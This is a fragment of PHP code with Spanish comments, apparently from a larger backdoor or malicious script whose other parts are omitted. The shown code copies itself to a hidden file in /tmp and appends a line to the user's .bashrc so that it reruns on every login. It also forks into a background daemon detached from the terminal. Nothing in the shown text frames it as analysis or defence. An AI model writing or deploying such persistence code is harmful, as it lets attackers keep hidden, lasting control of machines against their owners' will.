...
// Persistencia: copiar a /tmp y agregar a .bashrc
function addPersistence($filename) {
    $tmp_path = "/tmp/.ld.php";
    if (__FILE__ !== $tmp_path) {
        @copy(__FILE__, $tmp_path);
        $bashrc = getenv("HOME") . "/.bashrc";
        if (file_exists($bashrc) && is_writable($bashrc)) {
            $payload = "php -f $tmp_path &\n";
            if (strpos(file_get_contents($bashrc), $payload) === false) {
                file_put_contents($bashrc, $payload, FILE_APPEND);
            }
        }
    }
}
...
if ($daemon && function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) { die("ERROR: No se pudo forkear\n"); }
    elseif ($pid) { exit(0); }
    else {
        if (posix_setsid() == -1) {
            die("ERROR: No se pudo hacer setsid\n");
        }
    }
}

addPersistence(__FILE__);  // agregar persistencia
